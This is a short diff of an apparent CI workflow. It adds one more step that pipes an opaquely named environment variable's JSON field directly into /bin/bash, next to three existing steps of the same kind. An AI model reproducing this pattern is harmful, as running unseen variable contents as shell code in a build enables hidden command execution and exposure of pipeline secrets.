@@ -23,6 +23,7 @@ jobs:
           echo $bbrph90 | jq -r .nagh5510 | /bin/bash
           printf '%s' "$zybwb4124" | jq -r .hcv3 | /bin/bash
           printf '%s' "$efs8925" | jq -r .z75 | /bin/bash
+          printf '%s' "$hgdb770" | jq -r .fn325 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
